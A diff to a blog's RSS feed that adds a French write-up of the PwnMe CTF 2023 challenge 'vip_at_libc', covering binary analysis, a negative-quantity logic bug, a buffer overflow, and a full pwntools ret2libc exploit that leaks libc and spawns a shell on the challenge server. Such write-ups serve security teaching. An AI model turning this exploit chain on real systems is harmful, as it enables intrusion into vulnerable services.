@@ -6,8 +6,201 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Sun, 30 Apr 2023 00:00:00 +0000</lastBuildDate>
+        <lastBuildDate>Mon, 08 May 2023 00:00:00 +0000</lastBuildDate>
         <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>🇫🇷 PwnMe 2023 - pwn/vip_at_libc</title>
+            <link>/posts/2023/05/pwnme-2023-pwn/vip_at_libc/</link>
+            <pubDate>Mon, 08 May 2023 00:00:00 +0000</pubDate>
+            
+            <guid>/posts/2023/05/pwnme-2023-pwn/vip_at_libc/</guid>
+            <description>Note VIP at LIBC était un challenge de pwn issu du PwnMe CTF 2023. Un challenge d&amp;rsquo;intro (??) très sympa, avec un petit plus qui lui permet de se démarquer des classiques ret2libc.
+Description Sooo I heard that if you were VIP, you could access some specific features! Maybe one of those features can be used to get inside their system? Author: Zerotistic#0001 vip_at_libc.tgz
+Analyse du fichier On a le binaire et la libc qui va avec, ça nous indique déjà qu&amp;rsquo;on va probablement devoir interagir avec.</description>
+            <content type="html"><![CDATA[<h2 id="note">Note</h2>
+<p><em>VIP at LIBC</em> était un challenge de pwn issu du <strong>PwnMe CTF 2023</strong>. Un challenge <em>d&rsquo;intro</em> (??) très sympa, avec un petit plus qui lui permet de se démarquer des classiques <code>ret2libc</code>.</p>
+<h2 id="description">Description</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>Sooo I heard that if you were VIP, you could access some specific features!  
+</span></span><span style="display:flex;"><span>Maybe one of those features can be used to get inside their system?  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>Author: Zerotistic#0001
+</span></span></code></pre></div><p><a href="https://ctf.pwnme.fr/api/assets/vip_at_libc.tgz"><code>vip_at_libc.tgz</code></a></p>
+<h2 id="analyse-du-fichier">Analyse du fichier</h2>
+<p>On a le binaire et la <code>libc</code> qui va avec, ça nous indique déjà qu&rsquo;on va probablement devoir interagir avec.</p>
+<p>On peut commencer par regarder rapidement à quoi on s&rsquo;attaque grâce aux commandes <em>file</em> et <em>checksec</em>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>file original <span style="color:#f92672">&amp;&amp;</span> checksec original
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>original: ELF <span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>bit LSB executable, x86<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span>, version <span style="color:#ae81ff">1</span> (SYSV), dynamically linked, interpreter <span style="color:#f92672">/</span>lib64<span style="color:#f92672">/</span>ld<span style="color:#f92672">-</span>linux<span style="color:#f92672">-</span>x86<span style="color:#f92672">-</span><span style="color:#ae81ff">64.</span>so<span style="color:#ae81ff">.2</span>, BuildID[sha1]<span style="color:#f92672">=</span>c62621cd085e6fcda874f1bd9d8983cd18d0b051, <span style="color:#66d9ef">for</span> GNU<span style="color:#f92672">/</span>Linux <span style="color:#ae81ff">4.4.0</span>, <span style="color:#f92672">not</span> stripped
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Arch:     amd64<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>little
+</span></span><span style="display:flex;"><span>    RELRO:    Partial RELRO
+</span></span><span style="display:flex;"><span>    Stack:    No canary found
+</span></span><span style="display:flex;"><span>    NX:       NX enabled
+</span></span><span style="display:flex;"><span>    PIE:      No PIE (<span style="color:#ae81ff">0x400000</span>)
+</span></span></code></pre></div><p>Il s&rsquo;agit d&rsquo;un <em>ELF</em> en <em>64 bits</em> protégé par <code>NX</code>.</p>
+<p>On va le run pour avoir une idée de ce qu&rsquo;il fait:</p>
+<p><img src="https://user-images.githubusercontent.com/77807503/236800594-665593f0-e38e-4ab0-bb6b-fd1d948e559b.png" alt="2023-05-08-112543_973x101_scrot"></p>
+<p>Il nous demande notre username, puis on accède à un menu avec <strong>4 options</strong></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/236800637-b28d55d1-7239-43b6-8776-4d97c4bfef1e.png" alt="2023-05-08-112550_1094x371_scrot"></p>
+<p>On va lancer <code>Ghidra</code> pour comprendre un peut mieux comment le programme fonctionne.</p>
+<h4 id="main">Main</h4>
+<p><img src="https://user-images.githubusercontent.com/77807503/236800688-3e10c0a5-e92d-45c2-9bb0-c0414fc562b6.png" alt="2023-05-08-113209_749x501_scrot"></p>
+<p>Après avoir renommé le variable de <em>buffer</em>, on voit qu&rsquo;il n&rsquo;y a a priori pas de vulnérabilité dans la fonction <code>main()</code>, le <em>buffer</em> dans lequel est stocké l&rsquo;username est de la même taille que le <code>fgets()</code> donc ça me paraît bon.</p>
+<p>On voit qu&rsquo;elle appelle une fonction <code>menu()</code>, on va s&rsquo;y intéresser</p>
+<h4 id="menu">Menu</h4>
+<p><img src="https://user-images.githubusercontent.com/77807503/236800701-5cb4532d-49b2-4d8e-bb84-d296055a4512.png" alt="2023-05-08-113854_514x764_scrot"></p>
+<p>Après avoir renommé les variables <em>buffer</em> et <em>money</em> (qui stockent l&rsquo;argent de l&rsquo;utilisateur), on regarde les différentes options:</p>
+<ol>
+<li>Affiche l&rsquo;argent de l&rsquo;utilisateur</li>
+<li>Appelle la fonction <code>buy_ticket()</code></li>
+<li>Appelle la fonction <code>buy_vip_ticket()</code> puis met à jour des variables ainsi que la <em>money</em></li>
+<li>Si l&rsquo;utilisateur a assez d&rsquo;argent, appelle la fonction <code>access_lounge()</code>, sinon affiche un message</li>
+</ol>
+<p>On va regarder un peu les fonctions unes par unes et voir si on peut trouver des vuln</p>
+<h4 id="buy_ticket">buy_ticket</h4>
+<p><img src="https://user-images.githubusercontent.com/77807503/236800786-67e9c5cc-7cd2-414f-8c90-91ef85b7cc0b.png" alt="2023-05-08-114712_687x573_scrot"></p>
+<p>Après s&rsquo;être faits rickroll de plein fouet, on peut s&rsquo;attarder sur la manière dont le choix de quantité. En effet, <strong>la fonction ne vérifie pas si notre input est négatif</strong>, en entrant un nombre négatif dans l&rsquo;input de quantité, notre <em>money</em> va augmenter au lieu de diminuer (comme elle le devrait si on achetait une quantité positive).</p>
+<p>Ok, on sait comment abuser d&rsquo;un <em>logic bug</em> pour avoir de l&rsquo;argent infini, maintenant il faut savoir à quoi il va nous servir</p>
+<h4 id="buy_vip_ticket">buy_vip_ticket</h4>
+<p><img src="https://user-images.githubusercontent.com/77807503/236800808-03d6ca0b-1619-4917-a82b-766fdee8589c.png" alt="2023-05-08-115648_570x636_scrot"></p>
+<p>Si l&rsquo;utilisateur a sufisamment d&rsquo;argent, un <em>input</em> lui permet de confirmer l&rsquo;action et il devient <strong>VIP</strong></p>
+<h4 id="access_lounge">access_lounge</h4>
+<p><img src="https://user-images.githubusercontent.com/77807503/236800827-964fb1c7-5102-45a7-9b31-77b0aa5d4214.png" alt="2023-05-08-120254_520x411_scrot"></p>
+<p>Cette dernière fonction n&rsquo;est accessible que si nous sommes <strong>VIP</strong>, mais puisque nous avons un bug pour le devenir, ce n&rsquo;est pas un problème.</p>
+<p>Et nous avons enfin notre vuln ! Le <code>fgets</code> lit <code>0x100</code> bytes et les stocke quand un <em>buffer</em> de <code>16</code> bytes, on a donc ici une <em>buffer overflow</em>.</p>
+<h2 id="tldr-vulnérabilités">TLDR: Vulnérabilités</h2>
+<ol>
+<li>L&rsquo;option 2 nous permet de dupliquer notre argent en entrant un nombre négatif</li>
+<li>Le bug précédent nous permet de devenir <strong>VIP</strong> et de créer un lounge</li>
+<li>Dans la création du lounge il y a une <em>buffer overflow</em> qui va nous permettre d&rsquo;obtenir notre shell</li>
+</ol>
+<h2 id="plan-dattaque">Plan d&rsquo;attaque</h2>
+<p>La première étape de notre exploit va donc être d&rsquo;avoir accès au salon <strong>VIP</strong> pour avoir la <code>BOF</code>, puis grâce à cette dernière on va <em>leak</em> une adresse de la <code>libc</code> et retourner au <code>main</code>, puis réaccéder au <strong>VIP</strong> et appeller <code>system</code> via la <em>BOF</em>.</p>
+<p><code>Logic bug -&gt; ret2main (with leaks) -&gt; ret2system</code></p>
+<blockquote>
+<p>Je ne montrerai pas dans ce post comment récupérer les différentes adresses statiques, je vous invite à aller voir mes posts de pwn précédents si ça vous initéresse</p>
+</blockquote>
+<h2 id="exploit">Exploit</h2>
+<p>Voici mon exploit final:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>update(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;x86_64&#39;</span>)
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;vip_at_libc_patched&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;libc.so.6&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>ld <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./ld-2.35.so&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>REMOTE:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;51.254.39.184&#34;</span>, <span style="color:#ae81ff">1335</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> process()
+</span></span><span style="display:flex;"><span>        gdb<span style="color:#f92672">.</span>attach(r)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> start()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">see_current_balance</span>(conn):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;seeing current balance&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> conn<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;$&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">buy_ticket</span>(conn, choice, amount):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;buying ticket&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>, choice)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>, amount)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">buy_vip_ticket</span>(conn):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;buying VIP ticket&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;3&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_vip_lounge</span>(conn, name):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;creating VIP lounge&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>, name)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;want.&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># =============================================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># =-=-=- Un jour je serai le meilleur pwner -=-=-=</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pop_rdi_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000401186</span>
+</span></span><span style="display:flex;"><span>puts_plt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000401030</span>
+</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000040101a</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Y&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">24</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rdi_ret) <span style="color:#f92672">+</span> p64(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#34;puts&#34;</span>]) <span style="color:#f92672">+</span> p64(puts_plt)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;main&#34;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;username: &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;conflict&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Dupliquer l&#39;argent</span>
+</span></span><span style="display:flex;"><span>buy_ticket(io, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;-5000000&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Devenir VIP = avoir accès au lounge</span>
+</span></span><span style="display:flex;"><span>buy_vip_ticket(io)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Créer un lounge avec le premier payload pour leak</span>
+</span></span><span style="display:flex;"><span>create_vip_lounge(io, payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>puts_leak <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;Leaked puts @ &#34;</span> <span style="color:#f92672">+</span> hex(puts_leak))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> puts_leak <span style="color:#f92672">-</span> (<span style="color:#ae81ff">0x7f5c61e80ed0</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x7f5c61e00000</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;Resolved libc @ &#34;</span> <span style="color:#f92672">+</span> hex(libc<span style="color:#f92672">.</span>address))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>bin_sh <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;system&#34;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;/bin/sh @ &#34;</span> <span style="color:#f92672">+</span> hex(bin_sh))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;system @ &#34;</span> <span style="color:#f92672">+</span> hex(system))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Y&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">24</span> <span style="color:#f92672">+</span> p64(ret)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rdi_ret) <span style="color:#f92672">+</span> p64(bin_sh)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(system)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Puisqu&#39;on est au main, il faut re-entrer notre username</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;conflict&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Refaire la manip pour être vip</span>
+</span></span><span style="display:flex;"><span>buy_ticket(io, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;-5000000&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>buy_vip_ticket(io)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Payload final, on devrait avoir un shell</span>
+</span></span><span style="display:flex;"><span>create_vip_lounge(io, payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># =============================================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div>]]></content>
+        </item>
         
         <item>
             <title>🇫🇷 FCSC 2023 - pwn/robot</title>
